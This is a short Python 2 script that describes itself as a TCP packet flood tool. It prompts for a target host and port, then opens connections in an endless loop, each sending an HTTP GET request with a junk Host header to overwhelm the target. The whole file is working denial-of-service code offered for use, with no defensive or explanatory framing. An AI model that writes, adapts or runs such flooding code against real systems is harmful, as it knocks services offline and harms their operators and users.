#!/usr/bin/python
# Short, simple TCP packet flood tool, can be used to *attempt* to flood any open port regardless of status code received
# Success depends on the vulnerability of the target of course
import socket

target_host = raw_input("Host: ")
target_port = int(raw_input("Port: "))
packets = 0

while True:
	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	client.connect((target_host,target_port))
	client.send("GET / HTTP/1.1\r\nHost:{0}?loldongsloldongsloldongs\r\n\r\n".format(target_host))
	response = client.recv(4096)
	if response:
		if packets == 1:
			print "%d packet sent to... %s:%s" % (packets, target_host, target_port)
		else:
			print "%d packets sent to... %s:%s" % (packets, target_host, target_port)
		packets += 1
